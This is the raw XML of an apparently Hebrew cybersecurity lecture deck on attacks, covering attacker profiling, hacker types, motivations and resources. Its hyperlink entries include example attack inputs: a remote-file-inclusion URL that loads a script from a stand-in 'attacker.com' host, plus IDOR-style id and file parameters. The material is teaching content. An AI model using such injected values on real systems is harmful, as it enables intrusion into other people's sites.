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301" r:id="rId44"/>
    <p:sldId id="303" r:id="rId45"/>
    <p:sldId id="304" r:id="rId46"/>
    <p:sldId id="305" r:id="rId47"/>
    <p:sldId id="308" r:id="rId48"/>
    <p:sldId id="309" r:id="rId49"/>
    <p:sldId id="312" r:id="rId50"/>
    <p:sldId id="313" r:id="rId51"/>
    <p:sldId id="314" r:id="rId52"/>
    <p:sldId id="315" r:id="rId53"/>
    <p:sldId id="316" r:id="rId54"/>
    <p:sldId id="298" r:id="rId55"/>
    <p:sldId id="299" r:id="rId56"/>
    <p:sldId id="300" r:id="rId57"/>
    <p:sldId id="302" r:id="rId58"/>
    <p:sldId id="306" r:id="rId59"/>
    <p:sldId id="307" r:id="rId60"/>
    <p:sldId id="310" r:id="rId61"/>
    <p:sldId id="311"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2" r:id="rId117"/>
    <p:sldId id="373" r:id="rId118"/>
    <p:sldId id="374" r:id="rId119"/>
    <p:sldId id="375" r:id="rId120"/>
    <p:sldId id="376" r:id="rId121"/>
    <p:sldId id="371" r:id="rId122"/>
    <p:sldId id="377" r:id="rId123"/>
    <p:sldId id="378" r:id="rId124"/>
    <p:sldId id="379" r:id="rId125"/>
    <p:sldId id="380" r:id="rId126"/>
    <p:sldId id="381" r:id="rId127"/>
    <p:sldId id="382" r:id="rId128"/>
    <p:sldId id="385" r:id="rId129"/>
    <p:sldId id="386" r:id="rId130"/>
    <p:sldId id="383" r:id="rId131"/>
    <p:sldId id="384"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8" r:id="rId163"/>
    <p:sldId id="419" r:id="rId164"/>
    <p:sldId id="420" r:id="rId165"/>
    <p:sldId id="421" r:id="rId166"/>
    <p:sldId id="422" r:id="rId167"/>
    <p:sldId id="423" r:id="rId168"/>
    <p:sldId id="424" r:id="rId169"/>
    <p:sldId id="425" r:id="rId170"/>
    <p:sldId id="426" r:id="rId171"/>
    <p:sldId id="427" r:id="rId172"/>
    <p:sldId id="428" r:id="rId173"/>
    <p:sldId id="429" r:id="rId174"/>
    <p:sldId id="430" r:id="rId175"/>
    <p:sldId id="431" r:id="rId176"/>
    <p:sldId id="432" r:id="rId177"/>
    <p:sldId id="433" r:id="rId178"/>
    <p:sldId id="434" r:id="rId179"/>
    <p:sldId id="435" r:id="rId180"/>
    <p:sldId id="436" r:id="rId181"/>
    <p:sldId id="437" r:id="rId182"/>
    <p:sldId id="438" r:id="rId183"/>
    <p:sldId id="439" r:id="rId184"/>
    <p:sldId id="440" r:id="rId185"/>
    <p:sldId id="441" r:id="rId186"/>
    <p:sldId id="442" r:id="rId187"/>
    <p:sldId id="443" r:id="rId188"/>
    <p:sldId id="444" r:id="rId189"/>
    <p:sldId id="445" r:id="rId190"/>
    <p:sldId id="446" r:id="rId191"/>
    <p:sldId id="447" r:id="rId192"/>
    <p:sldId id="448" r:id="rId193"/>
    <p:sldId id="451" r:id="rId194"/>
    <p:sldId id="452" r:id="rId195"/>
    <p:sldId id="453" r:id="rId196"/>
    <p:sldId id="449" r:id="rId197"/>
    <p:sldId id="450" r:id="rId198"/>
    <p:sldId id="454" r:id="rId199"/>
    <p:sldId id="455" r:id="rId200"/>
    <p:sldId id="456" r:id="rId201"/>
    <p:sldId id="457" r:id="rId202"/>
    <p:sldId id="458" r:id="rId20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987" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr varScale="1">
        <p:scale>
          <a:sx n="73" d="100"/>
          <a:sy n="73" d="100"/>
        </p:scale>
        <p:origin x="41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tableStyles" Target="tableStyle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204"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9E891669-81FA-4F5B-92D8-EC9EE8150829}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ב'/חשון/תשפ"ה</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55C21505-7634-4C34-8B5B-7D1DDD8F065F}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="167574692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3705443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9E891669-81FA-4F5B-92D8-EC9EE8150829}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ב'/חשון/תשפ"ה</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3087554426"/>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2981509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1112795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23287957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2846149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55C21505-7634-4C34-8B5B-7D1DDD8F065F}"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90212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9E891669-81FA-4F5B-92D8-EC9EE8150829}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ב'/חשון/תשפ"ה</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55C21505-7634-4C34-8B5B-7D1DDD8F065F}"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36971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3207207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9E891669-81FA-4F5B-92D8-EC9EE8150829}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ב'/חשון/תשפ"ה</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55C21505-7634-4C34-8B5B-7D1DDD8F065F}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3016180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E891669-81FA-4F5B-92D8-EC9EE8150829}" type="datetimeFigureOut">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>ב'/חשון/תשפ"ה</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55C21505-7634-4C34-8B5B-7D1DDD8F065F}" type="slidenum">
              <a:rPr lang="he-IL" smtClean="0"/>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="he-IL"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="379173388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hyperlink" Target="http://example.com/" TargetMode="Externa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hyperlink" Target="http://localhost:8888/sensitive_endpoint" TargetMode="Externa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hyperlink" Target="http://localhost:8888/sensitive_endpoint" TargetMode="Externa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hyperlink" Target="http://localhost:8888/" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://example.com/login" TargetMode="Externa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hyperlink" Target="http://example.com/login" TargetMode="Externa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6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hyperlink" Target="http://victim-site.com/?page=http://attacker.com/malicious.php" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="http://malicious-site.com/badfile.php=lang" TargetMode="Externa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hyperlink" Target="https://example.com/account?id=1235" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/account?id=1234" TargetMode="Externa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hyperlink" Target="https://example.com/download?file=invoice124.pdf" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/download?file=invoice123.pdf" TargetMode="Externa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hyperlink" Target="http://localhost/simple_idor/index.php?user_id=1" TargetMode="Externa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4F9477-BFC1-4C78-B79C-D71EE7C630B6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הרצאה 5</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="כותרת משנה 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{35440D10-2537-4770-A19D-E091A1100321}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>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1372248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4441BEE-09AA-49E3-B72C-DAC059A6BFB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="365125"/>
            <a:ext cx="10515600" cy="5379692"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="9600" dirty="0"/>
              <a:t>תקיפות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1939691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8226DF-7845-42E0-81F8-C5428CEA38FB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2574234" y="642594"/>
            <a:ext cx="8550965" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פרופיל תוקף </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Attacker Profiling</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{54A53547-465D-44D4-96BA-B68DAFBE5FC9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0"/>
              <a:t>פרופיל תוקף הוא תיאור מפורט של תוקף אפשרי, הכולל מאפיינים פסיכולוגיים, טכניים, וחברתיים, במטרה להבין את המניעים, היכולות והשיטות בהן התוקף עשוי להשתמש. מטרת הפרופיל היא לעזור </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0" err="1"/>
              <a:t>למגיני</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0"/>
              <a:t> המערכות להיערך טוב יותר ולהתמודד עם התקפות פוטנציאליות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" b="1" dirty="0"/>
              <a:t>למה זה חשוב?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0"/>
              <a:t>1. זיהוי מוקדם: הבנה טובה יותר של התוקף מאפשרת זיהוי מוקדם של ניסיונות התקפה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0"/>
              <a:t>2. תגובה מותאמת: פרופיל מדויק מאפשר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0" err="1"/>
              <a:t>למגיני</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0"/>
              <a:t> המערכות להתאים את ההגנה ואת התגובה לתקיפה בצורה יעילה יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="1800" dirty="0"/>
              <a:t>3. מניעה: ידיעת המניעים והיכולות של התוקף יכולה לסייע במניעת התקפות עתידיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="360163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2BD22A9-9AA0-4FEC-B86C-0A7F3580BF69}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8179904" y="642594"/>
            <a:ext cx="2945296" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי תוקפים</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
            </a:br>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7386F8CD-2F76-43EB-B41F-3DC62719823B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1451113"/>
            <a:ext cx="10058400" cy="5098774"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>האקרים "כובעי שחור" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Black Hat Hackers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים שמבצעים פעולות לא חוקיות למטרות רווח אישי, נזק או פרסום.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סיפור: נועם, האקר כובע שחור, פרץ למערכת של בנק גדול והצליח לגנוב מיליון דולר. הוא השתמש בכסף כדי לחיות חיים מפוארים ולבצע עוד פעולות פליליות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>האקרים "כובעי לבן" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :White Hat Hackers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מומחים לאבטחת מידע שפועלים בצורה חוקית ומוסרית כדי למצוא ולתקן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> במערכות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סיפור: הרבנית טובה, האקרית כובע לבן, עבדה בחברה לאבטחת מידע וגילתה פרצת אבטחה חמורה במערכת של בית חולים. בזכותה, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפירצה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוקנה והמידע הרפואי של המטופלים נשמר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>האקרים "כובעי אפור" </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Gray Hat Hackers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים שפועלים בחלק מהמקרים בצורה חוקית ובחלק אחר לא. לעיתים הם חושפים פרצות אבטחה באופן ציבורי כדי להביא לתיקון מהיר שלהן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סיפור: טרבלסי, האקר כובע אפור, מצא פרצה במערכת של רשת חברתית והודיע להם על כך. כשהם לא התייחסו, הוא פרסם את המידע בפורום ציבורי כדי ללחוץ עליהם לתקן את הבעיה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>האקרים ממניעים פוליטיים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t> :Hacktivists</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תוקפים שמבצעים פעולות פריצה למטרות פוליטיות, חברתיות או אידיאולוגיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סיפור: קבוצת האקטיביסטים "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>אנונימוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>" פרצה לאתר של ממשלה מושחתת ופרסמה מידע סודי שהראה את השחיתות שלה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="605636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04D984-D9ED-4A8F-8B13-42854D07D18E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4562060" y="642594"/>
            <a:ext cx="6563139" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>מאפיינים של פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06E0A370-556E-4A6E-AA80-54A18426D359}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מניעים </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Motivations</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. פיננסיים: תוקפים שמעוניינים להרוויח כסף, למשל דרך גניבת מידע רגיש, דרישות כופר או מכירת מידע גנוב בשוק השחור.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. פוליטיים/אידיאולוגיים: תוקפים עם מניעים פוליטיים או אידיאולוגיים, כמו האקטיביסטים שמנסים להשפיע על מדיניות ציבורית או להעלות מודעות לנושאים חברתיים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. נקמה: תוקפים שפועלים מתוך רצון לנקום, למשל עובדים לשעבר שמרגישים מקופחים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. אתגר/הנאה: תוקפים שמחפשים אתגר או הנאה בפעילות הפריצה עצמה, ללא מניעים כלכליים ברורים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. ריגול תעשייתי: תוקפים שמטרתם להשיג מידע סודי על מתחרים כדי להשיג יתרון עסקי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28238122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F56AF2-47F9-4D1B-8370-904D9D399629}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2484782" y="642594"/>
            <a:ext cx="8640417" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - מאפיינים של פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{14AB49FB-5C01-4C99-A8D3-0AF835663FD7}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>יכולות טכניות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Skills</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מתחילים: תוקפים בעלי ידע בסיסי שמשתמשים בכלים מוכנים מראש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. מתקדמים: תוקפים בעלי ידע מעמיק יותר שיכולים לפתח כלי פריצה משלהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מומחים: תוקפים ברמה גבוהה מאוד, לעיתים עם תמיכה ממשלתית, שיכולים לבצע התקפות מורכבות ומתוחכמות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3228197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BECDF1-0B0C-4D2D-953F-8A566A3AEADA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2584174" y="642594"/>
            <a:ext cx="8541026" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - מאפיינים של פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ACAA4A1B-498B-4CE3-9EB3-7DC4EC4C6AFE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>משאבים (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Resources):</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. זמן: כמה זמן יש לתוקף להקדיש למתקפה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כסף: התקציב שעומד לרשות התוקף לרכישת כלים, שירותים, או מידע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. תמיכה: האם התוקף פועל לבדו או כחלק מקבוצה, עם תמיכה לוגיסטית וטכנית.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="478727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9D98E18-600F-4461-BC91-9975A91E8BEA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2524538" y="642594"/>
            <a:ext cx="8600661" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - מאפיינים של פרופיל תוקף</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3BE47F9-5104-4F5E-A9ED-FA217623C684}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שיטות עבודה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Tactics, Techniques, and Procedures - TTPs</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פישינג</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
